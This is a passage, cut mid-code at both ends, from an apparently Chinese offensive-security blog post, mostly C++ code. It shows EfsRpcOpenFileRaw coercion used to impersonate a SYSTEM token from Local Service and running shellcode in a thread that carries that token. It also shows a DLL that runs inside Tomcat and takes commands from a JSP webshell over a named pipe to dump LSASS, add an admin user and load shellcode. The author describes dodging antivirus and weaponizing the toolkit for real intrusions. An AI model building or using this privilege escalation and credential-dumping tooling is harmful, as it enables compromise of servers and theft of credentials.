</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>  RPC_STATUS status;
</span></span><span style=display:flex><span>	RPC_WSTR pszStringBinding;
</span></span><span style=display:flex><span>	RPC_BINDING_HANDLE BindingHandle;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	status <span style=color:#f92672>=</span> RpcStringBindingCompose(
</span></span><span style=display:flex><span>		NULL,
</span></span><span style=display:flex><span>		(RPC_WSTR)<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;ncacn_np&#34;</span>,
</span></span><span style=display:flex><span>		(RPC_WSTR)<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>127.0.0.1&#34;</span>,
</span></span><span style=display:flex><span>		(RPC_WSTR)<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>pipe</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>lsass&#34;</span>,
</span></span><span style=display:flex><span>		NULL,
</span></span><span style=display:flex><span>		<span style=color:#f92672>&amp;</span>pszStringBinding
</span></span><span style=display:flex><span>	);
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	status <span style=color:#f92672>=</span> RpcBindingFromStringBinding(pszStringBinding, <span style=color:#f92672>&amp;</span>BindingHandle);
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	status <span style=color:#f92672>=</span> RpcStringFree(<span style=color:#f92672>&amp;</span>pszStringBinding);
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	RpcTryExcept{
</span></span><span style=display:flex><span>		PVOID pContent;
</span></span><span style=display:flex><span>		LPWSTR pwszFileName;
</span></span><span style=display:flex><span>		pwszFileName <span style=color:#f92672>=</span> (LPWSTR)LocalAlloc(LPTR, MAX_PATH <span style=color:#f92672>*</span> <span style=color:#66d9ef>sizeof</span>(WCHAR));
</span></span><span style=display:flex><span>		StringCchPrintf(pwszFileName, MAX_PATH, <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>127.0.0.1/pipe/random</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>C$</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>x&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>long</span> result;
</span></span><span style=display:flex><span>		wprintf(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[*] Invoking EfsRpcOpenFileRaw with target path: %ws</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#34;</span>, pwszFileName);
</span></span><span style=display:flex><span>		result <span style=color:#f92672>=</span> EfsRpcOpenFileRaw(
</span></span><span style=display:flex><span>			BindingHandle,
</span></span><span style=display:flex><span>			<span style=color:#f92672>&amp;</span>pContent,
</span></span><span style=display:flex><span>			pwszFileName,
</span></span><span style=display:flex><span>			<span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>		);
</span></span><span style=display:flex><span>		
</span></span><span style=display:flex><span>		status <span style=color:#f92672>=</span> RpcBindingFree(
</span></span><span style=display:flex><span>			<span style=color:#f92672>&amp;</span>BindingHandle                   <span style=color:#75715e>// Reference to the opened binding handle
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		);
</span></span><span style=display:flex><span>		LocalFree(pwszFileName);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>		RpcExcept(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		wprintf(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;RpcExcetionCode: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, RpcExceptionCode());
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> FALSE;
</span></span><span style=display:flex><span>	}RpcEndExcept
</span></span></code></pre></td></tr></table></div></div><p>每次调用EfsRpcOpenFileRaw都会触发SYSTEM进程连接命名管道，然后再通过ImpersonateNamedPipeClient模拟SYSTEM进程的权限执行代码，当ImpersonateNamedPipeClient函数调用成功后，当前线程的Token其实已经变成了SYSTEM账户的，特权代码执行完成后还可以用RevertToSelf恢复到原来的线程Token。</p><p>在我实现成功后遇到数字杀毒会拦截提权的行为，其实很多土豆提权成功后，会复制一份Token去创建进程，一般调用CreateProcessWithToken和CreateProcessAsUser比较多，被拦截的时候会是这样：</p><p><img src=https://images.payloads.online/2022-08-11-22-08-11.png alt></p><p>因此常规的办法是不行了，于是请教了头像哥，他的回复与我想的一样，用高权限的Token去跑一个特权线程，利用这个特权线程去执行Shellcode。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>ExecuteShellCodeWithToken</span>(HANDLE hToken) {
</span></span><span style=display:flex><span>	HANDLE hThread <span style=color:#f92672>=</span> INVALID_HANDLE_VALUE;
</span></span><span style=display:flex><span>	DWORD dwThreadId <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>	HANDLE hHeap <span style=color:#f92672>=</span> HeapCreate(HEAP_CREATE_ENABLE_EXECUTE <span style=color:#f92672>|</span> HEAP_ZERO_MEMORY, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	PVOID Mptr <span style=color:#f92672>=</span> HeapAlloc(hHeap, <span style=color:#ae81ff>0</span>, g_dwShellcodeSize);
</span></span><span style=display:flex><span>	RtlCopyMemory(Mptr, g_ShellcodeBuffer, g_dwShellcodeSize);
</span></span><span style=display:flex><span>	hThread <span style=color:#f92672>=</span> CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Mptr, NULL, CREATE_SUSPENDED, <span style=color:#f92672>&amp;</span>dwThreadId);
</span></span><span style=display:flex><span>	SetThreadToken(<span style=color:#f92672>&amp;</span>hThread, hToken);
</span></span><span style=display:flex><span>	ResumeThread(hThread);
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>思路如下：</p><ul><li>将Shellcode拷贝到可执行堆内存块中</li><li>创建一个暂停的线程</li><li>将特权Token设置覆盖掉暂停的线程Token</li><li>恢复线程执行</li></ul><p>成功执行Shellcode后的样子是这样的：</p><p><img src=https://images.payloads.online/2022-08-11-22-08-27.png alt></p><p>上线的User是SYSTEM，但是whoami是Local Service，这是因为当前线程是SYSTEM的，获取用户名的GetUserName API是以当前线程Token作为权限查询的，而创建进程时并不会直接复制模拟的特权Token，这个时候只需要使用CobaltStrike的进程注入到其他SYSTEM进程即可。解决完Local Service提权到SYSTEM被数字杀毒拦截的问题后，那就要思考如何做武器化了，因为在实战中不可能上传一个个DLL文件，我需要把所有的代码写到一个DLL中，通过控制JSP Webshell的参数来达到各种功能的调用。</p><h2 id=0x07-武器化的思路与实现>0x07 武器化的思路与实现</h2><p>所有的代码跑在Tomcat的进程里的，而且只能执行DLLMain，那么怎么通过某种技术可以使得发送一个Web请求就执行DLL中的一些功能呢？</p><p>这个问题其实并没有难倒我，最简单的办法是用文件传递参数，每个Web请求过来后往文件中写内容，然后DLLMain里写一个循环读取也可以，但是文件的读写容易被干扰，并且涉及到线程的控制，稍微干扰一下就产生读写问题，容错率不高。</p><p>最终我采用了管道的形式，在DLLMain被执行时就创建一个命名管道，每个请求会连接管道往里写入16进制的单字节指令。</p><p>部分代码：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">93
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">94
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">95
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">96
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">97
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>for</span> (;;) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (ConnectNamedPipe(hPipe, NULL) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>            CHAR szBuffer[BUFF_SIZE];
</span></span><span style=display:flex><span>            BYTE  bMethod; <span style=color:#75715e>// 操作方法
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            ZeroMemory(szBuffer, BUFF_SIZE);
</span></span><span style=display:flex><span>            wprintf(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[+] Client Connected...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 读取操作方法
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            ReadFile(hPipe, <span style=color:#f92672>&amp;</span>bMethod, <span style=color:#ae81ff>1</span>, <span style=color:#f92672>&amp;</span>dwLen, NULL);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>switch</span> (bMethod)
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> METHOD_WMI_CREATE_PROCESS:
</span></span><span style=display:flex><span>                <span style=color:#75715e>/// &lt;summary&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// 调用WMIC创建进程，无回显
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// 参数：process
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;/summary&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;param name=&#34;&#34;&gt;&lt;/param&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;returns&gt;&lt;/returns&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                ReadFile(hPipe, szBuffer, BUFF_SIZE, <span style=color:#f92672>&amp;</span>dwLen, NULL);
</span></span><span style=display:flex><span>                CheckSuccessAndSendMsg(WMICCreateProcess(char2wchar(szBuffer)), hPipe);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> METHOD_MINIDUMP_LSASS:
</span></span><span style=display:flex><span>                <span style=color:#75715e>/// &lt;summary&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// 高权限的情况下转储Lsass进程内存
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// 参数：dump
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;/summary&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;param name=&#34;&#34;&gt;&lt;/param&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;returns&gt;&lt;/returns&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                CheckSuccessAndSendMsg(MiniDumpLsass(), hPipe);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> METHOD_ADD_USER:
</span></span><span style=display:flex><span>                <span style=color:#75715e>/// &lt;summary&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// 高权限的情况下添加用户
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// 参数：user
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;/summary&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;param name=&#34;&#34;&gt;&lt;/param&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;returns&gt;&lt;/returns&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                CheckSuccessAndSendMsg(CreateAdminUserInternal(), hPipe);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> METHOD_SHELL_CODE_LOADE:
</span></span><span style=display:flex><span>                <span style=color:#75715e>/// &lt;summary&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// 执行Shellcode
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// 参数：code
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;/summary&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;param name=&#34;&#34;&gt;&lt;/param&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;returns&gt;&lt;/returns&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                ReadFile(hPipe, szBuffer, BUFF_SIZE, <span style=color:#f92672>&amp;</span>dwLen, NULL);
</span></span><span style=display:flex><span>                CheckSuccessAndSendMsg(ExecuteShellCode(szBuffer, dwLen), hPipe);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> METHOD_GETSYSTEM:
</span></span><span style=display:flex><span>                <span style=color:#75715e>/// &lt;summary&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// 创建命名管道
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// 参数：system
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;/summary&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;param name=&#34;&#34;&gt;&lt;/param&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;returns&gt;&lt;/returns&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                CheckSuccessAndSendMsg(Service2System(), hPipe);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> METHOD_SYSTEM_EXECUTE:
</span></span><span style=display:flex><span>                <span style=color:#75715e>/// &lt;summary&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// 触发RPC连接提权管道
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// 参数：system-run
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;/summary&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;param name=&#34;&#34;&gt;&lt;/param&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;returns&gt;&lt;/returns&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                CheckSuccessAndSendMsg(Execute(), hPipe);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> METHOD_SET_SYSTEM_SHELLCODE:
</span></span><span style=display:flex><span>                <span style=color:#75715e>/// &lt;summary&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// 设置全局Shellcode
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// 参数：system-code
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;/summary&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>/// &lt;param name=&#34;&#34;&gt;&lt;/param&gt;
